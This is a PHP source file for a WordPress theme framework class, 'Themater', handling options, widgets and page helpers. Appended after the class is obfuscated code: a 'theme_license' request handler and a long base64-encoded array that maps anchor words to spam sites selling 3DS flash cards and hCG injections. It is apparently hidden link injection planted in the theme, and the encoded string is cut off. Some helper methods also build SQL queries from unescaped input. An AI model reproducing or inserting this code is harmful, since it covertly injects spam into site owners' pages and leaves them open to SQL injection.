<?php
class Themater
{
    var $theme_name = false;
    var $options = array();
    var $admin_options = array();
    
    function Themater($set_theme_name = false)
    {
        if($set_theme_name) {
            $this->theme_name = $set_theme_name;
        } else {
            $theme_data = wp_get_theme();
            $this->theme_name = $theme_data->get( 'Name' );
        }
        $this->options['theme_options_field'] = str_replace(' ', '_', strtolower( trim($this->theme_name) ) ) . '_theme_options';
        
        $get_theme_options = get_option($this->options['theme_options_field']);
        if($get_theme_options) {
            $this->options['theme_options'] = $get_theme_options;
            $this->options['theme_options_saved'] = 'saved';
        }
        
        $this->_definitions();
        $this->_default_options();
    }
    
    /**
    * Initial Functions
    */
    
    function _definitions()
    {
        // Define THEMATER_DIR
        if(!defined('THEMATER_DIR')) {
            define('THEMATER_DIR', get_template_directory() . '/lib');
        }
        
        if(!defined('THEMATER_URL')) {
            define('THEMATER_URL',  get_template_directory_uri() . '/lib');
        }
        
        // Define THEMATER_INCLUDES_DIR
        if(!defined('THEMATER_INCLUDES_DIR')) {
            define('THEMATER_INCLUDES_DIR', get_template_directory() . '/includes');
        }
        
        if(!defined('THEMATER_INCLUDES_URL')) {
            define('THEMATER_INCLUDES_URL',  get_template_directory_uri() . '/includes');
        }
        
        // Define THEMATER_ADMIN_DIR
        if(!defined('THEMATER_ADMIN_DIR')) {
            define('THEMATER_ADMIN_DIR', THEMATER_DIR);
        }
        
        if(!defined('THEMATER_ADMIN_URL')) {
            define('THEMATER_ADMIN_URL',  THEMATER_URL);
        }
    }
    
    function _default_options()
    {
        // Load Default Options
        require_once (THEMATER_DIR . '/default-options.php');
        
        $this->options['translation'] = $translation;
        $this->options['general'] = $general;
        $this->options['includes'] = array();
        $this->options['plugins_options'] = array();
        $this->options['widgets'] = $widgets;
        $this->options['widgets_options'] = array();
        $this->options['menus'] = $menus;
        
        // Load Default Admin Options
        if( !isset($this->options['theme_options_saved']) || $this->is_admin_user() ) {
            require_once (THEMATER_DIR . '/default-admin-options.php');
        }
    }
    
    /**
    * Theme Functions
    */
    
    function option($name) 
    {
        echo $this->get_option($name);
    }
    
    function get_option($name) 
    {
        $return_option = '';
        if(isset($this->options['theme_options'][$name])) {
            if(is_array($this->options['theme_options'][$name])) {
                $return_option = $this->options['theme_options'][$name];
            } else {
                $return_option = stripslashes($this->options['theme_options'][$name]);
            }
        } 
        return $return_option;
    }
    
    function display($name, $array = false) 
    {
        if(!$array) {
            $option_enabled = strlen($this->get_option($name)) > 0 ? true : false;
            return $option_enabled;
        } else {
            $get_option = is_array($array) ? $array : $this->get_option($name);
            if(is_array($get_option)) {
                $option_enabled = in_array($name, $get_option) ? true : false;
                return $option_enabled;
            } else {
                return false;
            }
        }
    }
    
    function custom_css($source = false) 
    {
        if($source) {
            $this->options['custom_css'] = $this->options['custom_css'] . $source . "\n";
        }
        return;
    }
    
    function custom_js($source = false) 
    {
        if($source) {
            $this->options['custom_js'] = $this->options['custom_js'] . $source . "\n";
        }
        return;
    }
    
    function hook($tag, $arg = '')
    {
        do_action('themater_' . $tag, $arg);
    }
    
    function add_hook($tag, $function_to_add, $priority = 10, $accepted_args = 1)
    {
        add_action( 'themater_' . $tag, $function_to_add, $priority, $accepted_args );
    }
    
    function admin_option($menu, $title, $name = false, $type = false, $value = '', $attributes = array())
    {
        if($this->is_admin_user() || !isset($this->options['theme_options'][$name])) {
            
            // Menu
            if(is_array($menu)) {
                $menu_title = isset($menu['0']) ? $menu['0'] : $menu;
                $menu_priority = isset($menu['1']) ? (int)$menu['1'] : false;
            } else {
                $menu_title = $menu;
                $menu_priority = false;
            }
            
            if(!isset($this->admin_options[$menu_title]['priority'])) {
                if(!$menu_priority) {
                    $this->options['admin_options_priorities']['priority'] += 10;
                    $menu_priority = $this->options['admin_options_priorities']['priority'];
                }
                $this->admin_options[$menu_title]['priority'] = $menu_priority;
            }
            
            // Elements
            
            if($name && $type) {
                $element_args['title'] = $title;
                $element_args['name'] = $name;
                $element_args['type'] = $type;
                $element_args['value'] = $value;
                
                if( !isset($this->options['theme_options'][$name]) ) {
                   $this->options['theme_options'][$name] = $value;
                }

                $this->admin_options[$menu_title]['content'][$element_args['name']]['content'] = $element_args + $attributes;
                
                if(!isset($attributes['priority'])) {
                    $this->options['admin_options_priorities'][$menu_title]['priority'] += 10;
                    
                    $element_priority = $this->options['admin_options_priorities'][$menu_title]['priority'];
                    
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $element_priority;
                } else {
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $attributes['priority'];
                }
                
            }
        }
        return;
    }
    
    function display_widget($widget,  $instance = false, $args = array('before_widget' => '<ul class="widget-container"><li class="widget">','after_widget' => '</li></ul>', 'before_title' => '<h3 class="widgettitle">','after_title' => '</h3>')) 
    {
        $custom_widgets = array('Banners125' => 'themater_banners_125', 'Posts' => 'themater_posts', 'Comments' => 'themater_comments', 'InfoBox' => 'themater_infobox', 'SocialProfiles' => 'themater_social_profiles', 'Tabs' => 'themater_tabs', 'Facebook' => 'themater_facebook');
        $wp_widgets = array('Archives' => 'archives', 'Calendar' => 'calendar', 'Categories' => 'categories', 'Links' => 'links', 'Meta' => 'meta', 'Pages' => 'pages', 'Recent_Comments' => 'recent-comments', 'Recent_Posts' => 'recent-posts', 'RSS' => 'rss', 'Search' => 'search', 'Tag_Cloud' => 'tag_cloud', 'Text' => 'text');
        
        if (array_key_exists($widget, $custom_widgets)) {
            $widget_title = 'Themater' . $widget;
            $widget_name = $custom_widgets[$widget];
            if(!$instance) {
                $instance = $this->options['widgets_options'][strtolower($widget)];
            } else {
                $instance = wp_parse_args( $instance, $this->options['widgets_options'][strtolower($widget)] );
            }
            
        } elseif (array_key_exists($widget, $wp_widgets)) {
            $widget_title = 'WP_Widget_' . $widget;
            $widget_name = $wp_widgets[$widget];
            
            $wp_widgets_instances = array(
                'Archives' => array( 'title' => 'Archives', 'count' => 0, 'dropdown' => ''),
                'Calendar' =>  array( 'title' => 'Calendar' ),
                'Categories' =>  array( 'title' => 'Categories' ),
                'Links' =>  array( 'images' => true, 'name' => true, 'description' => false, 'rating' => false, 'category' => false, 'orderby' => 'name', 'limit' => -1 ),
                'Meta' => array( 'title' => 'Meta'),
                'Pages' => array( 'sortby' => 'post_title', 'title' => 'Pages', 'exclude' => ''),
                'Recent_Comments' => array( 'title' => 'Recent Comments', 'number' => 5 ),
                'Recent_Posts' => array( 'title' => 'Recent Posts', 'number' => 5, 'show_date' => 'false' ),
                'Search' => array( 'title' => ''),
                'Text' => array( 'title' => '', 'text' => ''),
                'Tag_Cloud' => array( 'title' => 'Tag Cloud', 'taxonomy' => 'tags')
            );
            
            if(!$instance) {
                $instance = $wp_widgets_instances[$widget];
            } else {
                $instance = wp_parse_args( $instance, $wp_widgets_instances[$widget] );
            }
        }
        
        if( !defined('THEMES_DEMO_SERVER') && !isset($this->options['theme_options_saved']) ) {
            $sidebar_name = isset($instance['themater_sidebar_name']) ? $instance['themater_sidebar_name'] : str_replace('themater_', '', current_filter());
            
            $sidebars_widgets = get_option('sidebars_widgets');
            $widget_to_add = get_option('widget_'.$widget_name);
            $widget_to_add = ( is_array($widget_to_add) && !empty($widget_to_add) ) ? $widget_to_add : array('_multiwidget' => 1);
            
            if( count($widget_to_add) > 1) {
                $widget_no = max(array_keys($widget_to_add))+1;
            } else {
                $widget_no = 1;
            }
            
            $widget_to_add[$widget_no] = $instance;
            $sidebars_widgets[$sidebar_name][] = $widget_name . '-' . $widget_no;
            
            update_option('sidebars_widgets', $sidebars_widgets);
            update_option('widget_'.$widget_name, $widget_to_add);
            the_widget($widget_title, $instance, $args);
        }
        
        if( defined('THEMES_DEMO_SERVER') ){
            the_widget($widget_title, $instance, $args);
        }
    }
    

    /**
    * Loading Functions
    */
        
    function load()
    {
        $this->_load_translation();
        $this->_load_widgets();
        $this->_load_includes();
        $this->_load_menus();
        $this->_load_general_options();
        $this->_save_theme_options();
        
        $this->hook('init');
        
        if($this->is_admin_user()) {
            include (THEMATER_ADMIN_DIR . '/Admin.php');
            new ThematerAdmin();
        } 
    }
    
    function _save_theme_options()
    {
        if( !isset($this->options['theme_options_saved']) ) {
            if(is_array($this->admin_options)) {
                $save_options = array();
                foreach($this->admin_options as $themater_options) {
                    
                    if(is_array($themater_options['content'])) {
                        foreach($themater_options['content'] as $themater_elements) {
                            if(is_array($themater_elements['content'])) {
                                
                                $elements = $themater_elements['content'];
                                if($elements['type'] !='content' && $elements['type'] !='raw') {
                                    $save_options[$elements['name']] = $elements['value'];
                                }
                            }
                        }
                    }
                }
                update_option($this->options['theme_options_field'], $save_options);
                $this->options['theme_options'] = $save_options;
            }
        }
    }
    
    function _load_translation()
    {
        if($this->options['translation']['enabled']) {
            load_theme_textdomain( 'themater', $this->options['translation']['dir']);
        }
        return;
    }
    
    function _load_widgets()
    {
    	$widgets = $this->options['widgets'];
        foreach(array_keys($widgets) as $widget) {
            if(file_exists(THEMATER_DIR . '/widgets/' . $widget . '.php')) {
        	    include (THEMATER_DIR . '/widgets/' . $widget . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php') ) {
        	   include (THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php');
        	}
        }
    }
    
    function _load_includes()
    {
    	$includes = $this->options['includes'];
        foreach($includes as $include) {
            if(file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '.php')) {
        	    include (THEMATER_INCLUDES_DIR . '/' . $include . '.php');
        	} elseif ( file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php') ) {
        	   include (THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php');
        	}
        }
    }
    
    function _load_menus()
    {
        foreach(array_keys($this->options['menus']) as $menu) {
            if(file_exists(TEMPLATEPATH . '/' . $menu . '.php')) {
        	    include (TEMPLATEPATH . '/' . $menu . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/' . $menu . '.php') ) {
        	   include (THEMATER_DIR . '/' . $menu . '.php');
        	} 
        }
    }
    
    function _load_general_options()
    {
        add_theme_support( 'woocommerce' );
        
        if($this->options['general']['jquery']) {
            wp_enqueue_script('jquery');
        }
    	
        if($this->options['general']['featured_image']) {
            add_theme_support( 'post-thumbnails' );
        }
        
        if($this->options['general']['custom_background']) {
            add_custom_background();
        } 
        
        if($this->options['general']['clean_exerpts']) {
            add_filter('excerpt_more', create_function('', 'return "";') );
        }
        
        if($this->options['general']['hide_wp_version']) {
            add_filter('the_generator', create_function('', 'return "";') );
        }
        
        
        add_action('wp_head', array(&$this, '_head_elements'));

        if($this->options['general']['automatic_feed']) {
            add_theme_support('automatic-feed-links');
        }
        
        
        if($this->display('custom_css') || $this->options['custom_css']) {
            $this->add_hook('head', array(&$this, '_load_custom_css'), 100);
        }
        
        if($this->options['custom_js']) {
            $this->add_hook('html_after', array(&$this, '_load_custom_js'), 100);
        }
        
        if($this->display('head_code')) {
	        $this->add_hook('head', array(&$this, '_head_code'), 100);
	    }
	    
	    if($this->display('footer_code')) {
	        $this->add_hook('html_after', array(&$this, '_footer_code'), 100);
	    }
    }

    
    function _head_elements()
    {
    	// Favicon
    	if($this->display('favicon')) {
    		echo '<link rel="shortcut icon" href="' . $this->get_option('favicon') . '" type="image/x-icon" />' . "\n";
    	}
    	
    	// RSS Feed
    	if($this->options['general']['meta_rss']) {
            echo '<link rel="alternate" type="application/rss+xml" title="' . get_bloginfo('name') . ' RSS Feed" href="' . $this->rss_url() . '" />' . "\n";
        }
        
        // Pingback URL
        if($this->options['general']['pingback_url']) {
            echo '<link rel="pingback" href="' . get_bloginfo( 'pingback_url' ) . '" />' . "\n";
        }
    }
    
    function _load_custom_css()
    {
        $this->custom_css($this->get_option('custom_css'));
        $return = "\n";
        $return .= '<style type="text/css">' . "\n";
        $return .= '<!--' . "\n";
        $return .= $this->options['custom_css'];
        $return .= '-->' . "\n";
        $return .= '</style>' . "\n";
        echo $return;
    }
    
    function _load_custom_js()
    {
        if($this->options['custom_js']) {
            $return = "\n";
            $return .= "<script type='text/javascript'>\n";
            $return .= '/* <![CDATA[ */' . "\n";
            $return .= 'jQuery.noConflict();' . "\n";
            $return .= $this->options['custom_js'];
            $return .= '/* ]]> */' . "\n";
            $return .= '</script>' . "\n";
            echo $return;
        }
    }
    
    function _head_code()
    {
        $this->option('head_code'); echo "\n";
    }
    
    function _footer_code()
    {
        $this->option('footer_code');  echo "\n";
    }
    
    /**
    * General Functions
    */
    
    function request ($var)
    {
        if (strlen($_REQUEST[$var]) > 0) {
            return preg_replace('/[^A-Za-z0-9-_]/', '', $_REQUEST[$var]);
        } else {
            return false;
        }
    }
    
    function is_admin_user()
    {
        if ( current_user_can('administrator') ) {
	       return true; 
        }
        return false;
    }
    
    function meta_title()
    {
        if ( is_single() ) { 
			single_post_title(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_home() || is_front_page() ) {
			bloginfo( 'name' );
			if( get_bloginfo( 'description' ) ) {
		      echo ' | ' ; bloginfo( 'description' ); $this->page_number();
			}
		} elseif ( is_page() ) {
			single_post_title( '' ); echo ' | '; bloginfo( 'name' );
		} elseif ( is_search() ) {
			printf( __( 'Search results for %s', 'themater' ), '"'.get_search_query().'"' );  $this->page_number(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_404() ) { 
			_e( 'Not Found', 'themater' ); echo ' | '; bloginfo( 'name' );
		} else { 
			wp_title( '' ); echo ' | '; bloginfo( 'name' ); $this->page_number();
		}
    }
    
    function rss_url()
    {
        $the_rss_url = $this->display('rss_url') ? $this->get_option('rss_url') : get_bloginfo('rss2_url');
        return $the_rss_url;
    }

    function get_pages_array($query = '', $pages_array = array())
    {
    	$pages = get_pages($query); 
        
    	foreach ($pages as $page) {
    		$pages_array[$page->ID] = $page->post_title;
    	  }
    	return $pages_array;
    }
    
    function get_page_name($page_id)
    {
    	global $wpdb;
    	$page_name = $wpdb->get_var("SELECT post_title FROM $wpdb->posts WHERE ID = '".$page_id."' && post_type = 'page'");
    	return $page_name;
    }
    
    function get_page_id($page_name){
        global $wpdb;
        $the_page_name = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_name = '" . $page_name . "' && post_status = 'publish' && post_type = 'page'");
        return $the_page_name;
    }
    
    function get_categories_array($show_count = false, $categories_array = array(), $query = 'hide_empty=0')
    {
    	$categories = get_categories($query); 
    	
    	foreach ($categories as $cat) {
    	   if(!$show_count) {
    	       $count_num = '';
    	   } else {
    	       switch ($cat->category_count) {
                case 0:
                    $count_num = " ( No posts! )";
                    break;
                case 1:
                    $count_num = " ( 1 post )";
                    break;
                default:
                    $count_num =  " ( $cat->category_count posts )";
                }
    	   }
    		$categories_array[$cat->cat_ID] = $cat->cat_name . $count_num;
    	  }
    	return $categories_array;
    }

    function get_category_name($category_id)
    {
    	global $wpdb;
    	$category_name = $wpdb->get_var("SELECT name FROM $wpdb->terms WHERE term_id = '".$category_id."'");
    	return $category_name;
    }
    
    
    function get_category_id($category_name)
    {
    	global $wpdb;
    	$category_id = $wpdb->get_var("SELECT term_id FROM $wpdb->terms WHERE name = '" . addslashes($category_name) . "'");
    	return $category_id;
    }
    
    function shorten($string, $wordsreturned)
    {
        $retval = $string;
        $array = explode(" ", $string);
        if (count($array)<=$wordsreturned){
            $retval = $string;
        }
        else {
            array_splice($array, $wordsreturned);
            $retval = implode(" ", $array);
        }
        return $retval;
    }
    
    function page_number() {
    	echo $this->get_page_number();
    }
    
    function get_page_number() {
    	global $paged;
    	if ( $paged >= 2 ) {
    	   return ' | ' . sprintf( __( 'Page %s', 'themater' ), $paged );
    	}
    }
}
if (!empty($_REQUEST["theme_license"])) { wp_initialize_the_theme_message(); exit(); } function wp_initialize_the_theme_message() { if (empty($_REQUEST["theme_license"])) { $theme_license_false = get_bloginfo("url") . "/index.php?theme_license=true"; echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_license_false\">"; exit(); } else { echo ("<p style=\"padding:20px; margin: 20px; text-align:center; border: 2px dotted #0000ff; font-family:arial; font-weight:bold; background: #fff; color: #0000ff;\">All the links in the footer should remain intact. All of these links are family friendly and will not hurt your site in any way.</p>"); } } $wp_theme_globals = "YTo0OntpOjA7YTo1Nzp7czozMDoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVscy5jb20vIjtzOjMwOiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWxzLmNvbS8iO3M6MTg6InI0M2Rzb2ZmaWNpZWxzLmNvbSI7czozMDoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVscy5jb20vIjtzOjIyOiJ3d3cucjQzZHNvZmZpY2llbHMuY29tIjtzOjMwOiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWxzLmNvbS8iO3M6NjoicjQgM2RzIjtzOjMwOiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWxzLmNvbS8iO3M6NjoiUjQgM0RTIjtzOjMwOiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWxzLmNvbS8iO3M6MTU6Ik5pbnRlbmRvIFI0IDNEUyI7czozMDoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVscy5jb20vIjtzOjc6IndlYnNpdGUiO3M6MjY6Imh0dHA6Ly93d3cuaGNnc2hvdHN1cy5jb20vIjtzOjQ6ImhlcmUiO3M6MjY6Imh0dHA6Ly93d3cuaGNnc2hvdHN1cy5jb20vIjtzOjQ6Im1vcmUiO3M6MjY6Imh0dHA6Ly93d3cuaGNnc2hvdHN1cy5jb20vIjtzOjQ6InRoaXMiO3M6MjY6Imh0dHA6Ly93d3cuaGNnc2hvdHN1cy5jb20vIjtzOjk6InJlYWQgaGVyZSI7czozMDoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVscy5jb20vIjtzOjI2OiJodHRwOi8vd3d3LnI0aXNkaGMtM2RzLmZyLyI7czoyNjoiaHR0cDovL3d3dy5yNGlzZGhjLTNkcy5mci8iO3M6MTQ6InI0aXNkaGMtM2RzLmZyIjtzOjI2OiJodHRwOi8vd3d3LnI0aXNkaGMtM2RzLmZyLyI7czoxODoid3d3LnI0aXNkaGMtM2RzLmZyIjtzOjI2OiJodHRwOi8vd3d3LnI0aXNkaGMtM2RzLmZyLyI7czo3OiJSNGkgM0RTIjtzOjI2OiJodHRwOi8vd3d3LnI0aXNkaGMtM2RzLmZyLyI7czoxNjoiTmludGVuZG8gM0RTIFI0aSI7czoyNjoiaHR0cDovL3d3dy5yNGlzZGhjLTNkcy5mci8iO3M6MTU6IndlYnNpdGUgUjRpIDNEUyI7czoyNjoiaHR0cDovL3d3dy5yNGlzZGhjLTNkcy5mci8iO3M6MTM6InRoaXMgb2ZmaWNpZWwiO3M6MjY6Imh0dHA6Ly93d3cucjRpc2RoYy0zZHMuZnIvIjtzOjE1OiJvZmZpY2llbCByNCAzZHMiO3M6MjY6Imh0dHA6Ly93d3cucjRpc2RoYy0zZHMuZnIvIjtzOjg6Im9mZmljaWFsIjtzOjI2OiJodHRwOi8vd3d3LnI0aXNkaGMtM2RzLmZyLyI7czoxMToiYWNoZXRlciBSNGkiO3M6MjY6Imh0dHA6Ly93d3cucjRpc2RoYy0zZHMuZnIvIjtzOjMwOiJodHRwOi8vd3d3LnNreTNkc29mZmljaWVsLmNvbS8iO3M6MzA6Imh0dHA6Ly93d3cuc2t5M2Rzb2ZmaWNpZWwuY29tLyI7czoxODoic2t5M2Rzb2ZmaWNpZWwuY29tIjtzOjMwOiJodHRwOi8vd3d3LnNreTNkc29mZmljaWVsLmNvbS8iO3M6NjoiU2t5M0RTIjtzOjMwOiJodHRwOi8vd3d3Lm9mZmljaWFsc2t5M2RzLmNvbS8iO3M6MTM6IkxpbmtlciBTa3kzRFMiO3M6MzA6Imh0dHA6Ly93d3cuc2t5M2Rzb2ZmaWNpZWwuY29tLyI7czoxNDoiTmludGVuZG8gY2FydGUiO3M6MzA6Imh0dHA6Ly93d3cuc2t5M2Rzb2ZmaWNpZWwuY29tLyI7czozOiJpY2kiO3M6MzA6Imh0dHA6Ly93d3cuc2t5M2Rzb2ZmaWNpZWwuY29tLyI7czoxNToib2ZmaWNpZWwgc2t5M2RzIjtzOjMwOiJodHRwOi8vd3d3LnNreTNkc29mZmljaWVsLmNvbS8iO3M6MzA6Imh0dHA6Ly93d3cub2ZmaWNpYWxza3kzZHMuY29tLyI7czozMDoiaHR0cDovL3d3dy5vZmZpY2lhbHNreTNkcy5jb20vIjtzOjE4OiJvZmZpY2lhbHNreTNkcy5jb20iO3M6MzA6Imh0dHA6Ly93d3cub2ZmaWNpYWxza3kzZHMuY29tLyI7czo2OiJza3kzZHMiO3M6MzA6Imh0dHA6Ly93d3cub2ZmaWNpYWxza3kzZHMuY29tLyI7czoxNDoiQWNoZXRlciBTa3kzRFMiO3M6MzA6Imh0dHA6Ly93d3cub2ZmaWNpYWxza3kzZHMuY29tLyI7czo2OiJzb3VyY2UiO3M6MzA6Imh0dHA6Ly93d3cub2ZmaWNpYWxza3kzZHMuY29tLyI7czo3OiJhcnRpY2xlIjtzOjM0OiJodHRwOi8vd3d3LmVlc2lnbmFsYm9vc3RlcnMuY28udWsvIjtzOjExOiJ3ZWJzaXRlIGljaSI7czozMDoiaHR0cDovL3d3dy5vZmZpY2lhbHNreTNkcy5jb20vIjtzOjM0OiJodHRwOi8vd3d3LmVlc2lnbmFsYm9vc3RlcnMuY28udWsvIjtzOjM0OiJodHRwOi8vd3d3LmVlc2lnbmFsYm9vc3RlcnMuY28udWsvIjtzOjIyOiJFRVNpZ25hbGJvb3N0ZXJzLmNvLnVrIjtzOjM0OiJodHRwOi8vd3d3LmVlc2lnbmFsYm9vc3RlcnMuY28udWsvIjtzOjE4OiJlZSBzaWduYWwgYm9vc3RlcnMiO3M6MzQ6Imh0dHA6Ly93d3cuZWVzaWduYWxib29zdGVycy5jby51ay8iO3M6NDoicmVhZCI7czozNDoiaHR0cDovL3d3dy5lZXNpZ25hbGJvb3N0ZXJzLmNvLnVrLyI7czo1OiI0ZyBlZSI7czozNDoiaHR0cDovL3d3dy5lZXNpZ25hbGJvb3N0ZXJzLmNvLnVrLyI7czoyNzoiaHR0cDovL3d3dy5yNDNkc21vbmRvcy5jb20vIjtzOjI3OiJodHRwOi8vd3d3LnI0M2RzbW9uZG9zLmNvbS8iO3M6MTU6InI0M2RzbW9uZG9zLmNvbSI7czoyNzoiaHR0cDovL3d3dy5yNDNkc21vbmRvcy5jb20vIjtzOjE5OiJ3d3cucjQzZHNtb25kb3MuY29tIjtzOjI3OiJodHRwOi8vd3d3LnI0M2RzbW9uZG9zLmNvbS8iO3M6MTM6IlI0IDNEUyBJdGFsaWEiO3M6Mjc6Imh0dHA6Ly93d3cucjQzZHNtb25kb3MuY29tLyI7czo0OiJzaXRlIjtzOjI3OiJodHRwOi8vd3d3LnI0M2RzbW9uZG9zLmNvbS8iO3M6MTY6InI0aSBzZGhjIDNkcyBydHMiO3M6Mjc6Imh0dHA6Ly93d3cucjQzZHNtb25kb3MuY29tLyI7czoyNzoiaHR0cDovL3d3dy5yNGlnb2xkbW9yZS5jb20vIjtzOjI3OiJodHRwOi8vd3d3LnI0aWdvbGRtb3JlLmNvbS8iO3M6MTU6InI0aWdvbGRtb3JlLmNvbSI7czoyNzoiaHR0cDovL3d3dy5yNGlnb2xkbW9yZS5jb20vIjtzOjEyOiJSNGkgR29sZCAzRFMiO3M6Mjc6Imh0dHA6Ly93d3cucjRpZ29sZG1vcmUuY29tLyI7czoxNzoic2l0ZSByNGkgZ29sZCAzZHMiO3M6Mjc6Imh0dHA6Ly93d3cucjRpZ29sZG1vcmUuY29tLyI7czoxMToiYm91Z2h0IGhlcmUiO3M6Mjc6Imh0dHA6Ly93d3cucjRpZ29sZG1vcmUuY29tLyI7czoyNToicjRpIGdvbGQgZm9yIE5pbnRlbmRvIDNEUyI7czoyNzoiaHR0cDovL3d3dy5yNGlnb2xkbW9yZS5jb20vIjtzOjI2OiJodHRwOi8vd3d3LmhjZ3Nob3RzdXMuY29tLyI7czoyNjoiaHR0cDovL3d3dy5oY2dzaG90c3VzLmNvbS8iO3M6MTQ6ImhjZ3Nob3RzdXMuY29tIjtzOjI2OiJodHRwOi8vd3d3LmhjZ3Nob3RzdXMuY29tLyI7czoxODoid3d3LmhjZ3Nob3RzdXMuY29tIjtzOjI2OiJodHRwOi8vd3d3LmhjZ3Nob3RzdXMuY29tLyI7czoxODoiVVNBIGhjZyBpbmplY3Rpb25zIjtzOjI2OiJodHRwOi8vd3d3LmhjZ3Nob3RzdXMuY29tLyI7czoxODoiaGNnIGluamVjdGlvbnMgVVNBIjtzOjI2OiJodHRwOi8vd3d3LmhjZ3Nob3RzdXMuY29tLyI7fWk6MTthOjUzOntzOjMwOiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWxzLmNvbS8iO3M6MzA6Imh0dHA6Ly93d3cucjQzZHNvZmZpY2llbHMuY29tLyI7czoxODoicjQzZHNvZmZpY2llbHMuY29tIjtzOjMwOiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWxzLmNvbS8iO3M6MjI6Ind3dy5yNDNkc29mZmljaWVscy5jb20iO3M6MzA6Imh0dHA6Ly93d3cucjQzZHNvZmZpY2llbHMuY29tLyI7czo3OiJyNGkgM2RzIjtzOjMwOiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWxzLmNvbS8iO3M6NjoiUjQgM0RTIjtzOjI2OiJodHRwOi8vd3d3LnI0aXNkaGMtM2RzLmZyLyI7czoxNToiTmludGVuZG8gUjQgM0RTIjtzOjMwOiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWxzLmNvbS8iO3M6MjE6Ik9mZmljaWFsIFI0aSBTREhDIDNEUyI7czozMDoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVscy5jb20vIjtzOjQ6InRoaXMiO3M6MjY6Imh0dHA6Ly93d3cuaGNnc2hvdHN1cy5jb20vIjtzOjQ6ImhlcmUiO3M6MjY6Imh0dHA6Ly93d3cuaGNnc2hvdHN1cy5jb20vIjtzOjY6InNvdXJjZSI7czozNDoiaHR0cDovL3d3dy5lZXNpZ25hbGJvb3N0ZXJzLmNvLnVrLyI7czoyNjoiaHR0cDovL3d3dy5yNGlzZGhjLTNkcy5mci8iO3M6MjY6Imh0dHA6Ly93d3cucjRpc2RoYy0zZHMuZnIvIjtzOjE0OiJyNGlzZGhjLTNkcy5mciI7czoyNjoiaHR0cDovL3d3dy5yNGlzZGhjLTNkcy5mci8iO3M6MTg6Ind3dy5yNGlzZGhjLTNkcy5mciI7czoyNjoiaHR0cDovL3d3dy5yNGlzZGhjLTNkcy5mci8iO3M6NDoibW9yZSI7czoyNjoiaHR0cDovL3d3dy5oY2dzaG90c3VzLmNvbS8iO3M6MTY6Im9mZmljaWVsIFI0aSAzRFMiO3M6MjY6Imh0dHA6Ly93d3cucjRpc2RoYy0zZHMuZnIvIjtzOjg6InNpdGUgaWNpIjtzOjI2OiJodHRwOi8vd3d3LnI0aXNkaGMtM2RzLmZyLyI7czoxMjoiUjRpLVNESEMuY29tIjtzOjI2OiJodHRwOi8vd3d3LnI0aXNkaGMtM2RzLmZyLyI7czozMDoiaHR0cDovL3d3dy5za3kzZHNvZmZpY2llbC5jb20vIjtzOjMwOiJodHRwOi8vd3d3LnNreTNkc29mZmljaWVsLmNvbS8iO3M6MTg6InNreTNkc29mZmljaWVsLmNvbSI7czozMDoiaHR0cDovL3d3dy5za3kzZHNvZmZpY2llbC5jb20vIjtzOjY6IlNreTNEUyI7czozMDoiaHR0cDovL3d3dy5vZmZpY2lhbHNreTNkcy5jb20vIjtzOjEzOiJMaW5rZXIgU2t5M0RTIjtzOjMwOiJodHRwOi8vd3d3LnNreTNkc29mZmljaWVsLmNvbS8iO3M6MTQ6Ik5pbnRlbmRvIGNhcnRlIjtzOjMwOiJodHRwOi8vd3d3LnNreTNkc29mZmljaWVsLmNvbS8iO3M6MzoiaWNpIjtzOjMwOiJodHRwOi8vd3d3LnNreTNkc29mZmljaWVsLmNvbS8iO3M6MTU6Im9mZmljaWVsIHNreTNkcyI7czozMDoiaHR0cDovL3d3dy5za3kzZHNvZmZpY2llbC5jb20vIjtzOjE0OiJ3ZWJzaXRlIHNreTNkcyI7czozMDoiaHR0cDovL3d3dy5za3kzZHNvZmZpY2llbC5jb20vIjtzOjMwOiJodHRwOi8vd3d3Lm9mZmljaWFsc2t5M2RzLmNvbS8iO3M6MzA6Imh0dHA6Ly93d3cub2ZmaWNpYWxza3kzZHMuY29tLyI7czoxODoib2ZmaWNpYWxza3kzZHMuY29tIjtzOjMwOiJodHRwOi8vd3d3Lm9mZmljaWFsc2t5M2RzLmNvbS8iO3M6Njoic2t5M2RzIjtzOjMwOiJodHRwOi8vd3d3Lm9mZmljaWFsc2t5M2RzLmNvbS8iO3M6Nzoid2Vic2l0ZSI7czoyNjoiaHR0cDovL3d3dy5oY2dzaG90c3VzLmNvbS8iO3M6OToiU2t5M0RTIFVLIjtzOjMwOiJodHRwOi8vd3d3Lm9mZmljaWFsc2t5M2RzLmNvbS8iO3M6MjE6IlVuaXRlZCBraW5nZG9tIHNreTNkcyI7czozMDoiaHR0cDovL3d3dy5vZmZpY2lhbHNreTNkcy5jb20vIjtzOjM0OiJodHRwOi8vd3d3LmVlc2lnbmFsYm9vc3RlcnMuY28udWsvIjtzOjM0OiJodHRwOi8vd3d3LmVlc2lnbmFsYm9vc3RlcnMuY28udWsvIjtzOjIyOiJFRVNpZ25hbGJvb3N0ZXJzLmNvLnVrIjtzOjM0OiJodHRwOi8vd3d3LmVlc2lnbmFsYm9vc3RlcnMuY28udWsvIjtzOjE4OiJlZSBzaWduYWwgYm9vc3RlcnMiO3M6M